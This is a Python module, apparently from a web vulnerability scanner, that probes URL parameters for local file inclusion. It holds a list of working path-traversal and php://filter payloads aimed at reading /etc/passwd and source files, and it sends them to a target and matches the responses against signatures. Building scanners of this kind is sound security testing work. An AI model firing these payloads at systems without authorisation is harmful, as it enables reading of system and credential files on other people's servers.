"""
zentry/validators/lfi.py

Local File Inclusion Validator
"""
from typing import Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlunparse
import requests
from .base import BaseValidator, Finding

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

SIGNATURES = ["root:x:0:0", "daemon:x:1:1", "PD9waH"] # root:x:0:0, daemon:x:1:1, <?ph(p) in base64

class LFIValidator(BaseValidator):
    """
    Validator for Local File Inclusion vulnerabilities.
    """
    SIGNALS = ["file", "path", "page", "include", "load", "view", "document"]

    def validate(self, url: str, params: Optional[Dict[str, Any]] = None) -> Optional[Finding]:
        if not params:
            return None

        candidate_params = [p for p in params.keys() if p.lower() in self.SIGNALS]
        if not candidate_params:
            return None

        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        for param in candidate_params:
            original_value = query_params.get(param, [''])[0]

            for payload in PAYLOADS:
                query_params[param] = [payload]
                test_url = urlunparse(parsed_url._replace(query=self.urlencode(query_params)))

                try:
                    req = requests.get(test_url, timeout=10, allow_redirects=False)

                    if any(sig in req.text for sig in SIGNATURES):
                        description = f"LFI confirmed in parameter '{param}' with payload: {payload}"
                        evidence = {
                            "request": {"url": test_url},
                            "response": {"status": req.status_code, "body_snippet": req.text[:200]},
                        }
                        return self.confirm_finding(url, "LFI", "HIGH", description, evidence)
                
                except requests.RequestException:
                    continue
                finally:
                    # Restore original query param
                    query_params[param] = [original_value]
        
        return None

    def urlencode(self, query_params: Dict) -> str:
        """Custom urlencode to handle list values."""
        parts = []
        for key, values in query_params.items():
            for value in values:
                parts.append(f"{key}={value}")
        return "&".join(parts)
